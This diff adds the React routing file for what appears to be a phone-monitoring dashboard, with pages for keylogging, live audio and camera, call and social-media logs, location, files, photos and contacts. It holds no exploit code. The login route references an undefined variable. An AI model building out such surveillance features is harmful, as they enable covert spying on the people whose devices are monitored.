@@ -1,0 +1,154 @@
+import React, { useEffect, useState } from "react";
+import { BrowserRouter as Router, Route, Routes, Navigate } from "react-router-dom";
+import { Container, CssBaseline } from "@mui/material";
+import axios from "axios";
+import Navigation from "./components/Navigation";
+import Dashboard from "./pages/Dashboard";
+import AdminDashboard from "./pages/AdminDashboard";
+import Login from "./pages/Login";
+import Register from "./pages/Register";
+import ForgotPassword from "./pages/ForgotPassword";
+import DeviceManagement from "./pages/DeviceManagement";
+import LocationTracking from "./pages/LocationTracking";
+import CallLogs from "./pages/CallLogs";
+import SocialMediaLogs from "./pages/SocialMediaLogs";
+import AppUsage from "./pages/AppUsage";
+import BrowsingHistory from "./pages/BrowsingHistory";
+import LiveScreen from "./pages/LiveScreen";
+import SecurityControls from "./pages/SecurityControls";
+import UserProfile from "./pages/UserProfile";
+import Notifications from "./pages/Notifications";
+import PushNotifications from "./pages/PushNotifications";
+import UserActivityLogs from "./pages/UserActivityLogs";
+import Geofencing from "./pages/Geofencing";
+import Keylogger from "./pages/Keylogger";
+import BlockApps from "./pages/BlockApps";
+import FileAccess from "./pages/FileAccess";
+import PhotoAccess from "./pages/PhotoAccess";
+import ContactAccess from "./pages/ContactAccess";
+import LiveAudio from "./pages/LiveAudio";
+import LiveCamera from "./pages/LiveCamera";
+
+const App = () => {
+  const [is_authenticated, setIsAuthenticated] = useState(false);
+  const [is_admin, setIsAdmin] = useState(false);
+  const [loading, setLoading] = useState(true);
+
+  // ✅ Check Authentication Status
+useEffect(() => {
+  const checkAuthStatus = async () => {
+    const token = localStorage.getItem("token");
+
+    if (!token) {
+      console.warn("No authentication token found.");
+      setIsAuthenticated(false);
+      setIsAdmin(false);
+      setLoading(false);
+      return;
+    }
+
+    try {
+      const response = await axios.get("/api/tracker/auth-status/", {
+        headers: { Authorization: `Token ${token}` },
+        withCredentials: true,
+      });
+
+      console.log("Auth Response:", response.data); // ✅ Debugging Log
+
+      setIsAuthenticated(response.data.is_authenticated ?? false);
+      setIsAdmin(response.data.is_admin ?? false);
+    } catch (error) {
+      console.error("Auth check failed:", error);
+      setIsAuthenticated(false);
+      setIsAdmin(false);
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  checkAuthStatus();
+}, []);
+
+
+  // ✅ Handle Logout Functionality
+  const handleLogout = () => {
+    localStorage.removeItem("token");
+    setIsAuthenticated(false);
+    setIsAdmin(false);
+    window.location.href = "/login"; // ✅ Ensures Full Reload After Logout
+  };
+
+  if (loading) return <div>Loading...</div>;
+
+  return (
+    <Router>
+      <CssBaseline />
+      {is_authenticated && <Navigation is_authenticated={is_authenticated} is_admin={is_admin} handleLogout={handleLogout} />}
+
+      <Container>
+        <Routes>
+          {/* ✅ Public Routes */}
+          <Route 
+   path="/login" 
+  element={
+    isAuthenticated ? (
+      <Navigate to="/" replace />
+    ) : (
+      <Login setIsAuthenticated={setIsAuthenticated} setIsAdmin={setIsAdmin} />
+    )
+  } 
+/>
+
+          <Route path="/register" element={is_authenticated ? <Navigate to="/" replace /> : <Register />} />
+          <Route path="/forgot-password" element={is_authenticated ? <Navigate to="/" replace /> : <ForgotPassword />} />
+
+          {/* ✅ Redirect Admins & Users to their respective dashboards */}
+          {is_authenticated ? (
+            is_admin ? (
+              <Route path="/" element={<Navigate to="/admin-dashboard" replace />} />
+            ) : (
+              <Route path="/" element={<Navigate to="/dashboard" replace />} />
+            )
+          ) : (
+            <Route path="/" element={<Navigate to="/login" replace />} />
+          )}
+
+          {/* ✅ Protected Routes (Require Authentication) */}
+          {is_authenticated && (
+            <>
+              <Route path="/dashboard" element={<Dashboard />} />
+              {is_admin && <Route path="/admin-dashboard" element={<AdminDashboard />} />}
+
+              <Route path="/devices" element={<DeviceManagement />} />
+              <Route path="/location" element={<LocationTracking />} />
+              <Route path="/calls" element={<CallLogs />} />
+              <Route path="/social-media" element={<SocialMediaLogs />} />
+              <Route path="/app-usage" element={<AppUsage />} />
+              <Route path="/browsing-history" element={<BrowsingHistory />} />
+              <Route path="/live-screen" element={<LiveScreen />} />
+              <Route path="/security-controls" element={<SecurityControls />} />
+              <Route path="/profile" element={<UserProfile />} />
+              <Route path="/notifications" element={<Notifications />} />
+              {is_admin && <Route path="/admin" element={<AdminDashboard />} />}
+              <Route path="/push-notifications" element={<PushNotifications is_admin={is_admin} />} />
+              <Route path="/user-activity-logs" element={<UserActivityLogs />} />
+              <Route path="/geofencing" element={<Geofencing />} />
+              <Route path="/keylogger" element={<Keylogger />} />
+              <Route path="/block-apps" element={<BlockApps />} />
+              <Route path="/file-access" element={<FileAccess />} />
+              <Route path="/photo-access" element={<PhotoAccess />} />
+              <Route path="/contact-access" element={<ContactAccess />} />
+              <Route path="/live-audio" element={<LiveAudio />} />
+              <Route path="/live-camera" element={<LiveCamera />} />
+            </>
+          )}
+
+          {/* ✅ Catch-All Redirects */}
+          <Route path="*" element={<Navigate to={is_authenticated ? "/" : "/login"} replace />} />
+        </Routes>
+      </Container>
+    </Router>
+  );
+};
+
+export default App;
